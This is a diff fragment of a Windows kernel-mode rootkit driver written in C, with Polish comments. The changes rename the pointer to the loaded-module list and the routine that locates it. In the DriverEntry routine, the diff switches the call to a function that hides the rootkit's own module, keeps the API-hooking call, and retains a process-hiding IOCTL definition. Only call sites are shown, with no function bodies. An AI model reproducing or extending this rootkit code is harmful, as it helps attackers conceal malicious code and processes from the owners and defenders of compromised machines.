@@ -11,7 +11,7 @@
 #define		IOCTL_HIDE_PROCESS			(ULONG) CTL_CODE(FILE_DEVICE_SHADOW_DRIVER, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
 // lista zaladowanych modu³ów
-PMODULE_ENTRY	g_PsLoadedModuleList;
+PMODULE_ENTRY	g_ModuleListBegin;
 
 // obiekt urzadzenia sterownika rootkita
 PDEVICE_OBJECT	gp_DeviceObject = NULL;
@@ -280,9 +280,9 @@ NTSTATUS DriverEntry( IN PDRIVER_OBJECT driverObject, IN PUNICODE_STRING theRegi
 		return STATUS_UNSUCCESSFUL;
 	}
 
-	g_PsLoadedModuleList =  (PMODULE_ENTRY)FindPsLoadedModuleList(driverObject);
+	g_ModuleListBegin =  (PMODULE_ENTRY)GetModuleListBegin(driverObject);
 
-	HideModule();
+	HideRootkitModule();
 
 	HookApis();
 	
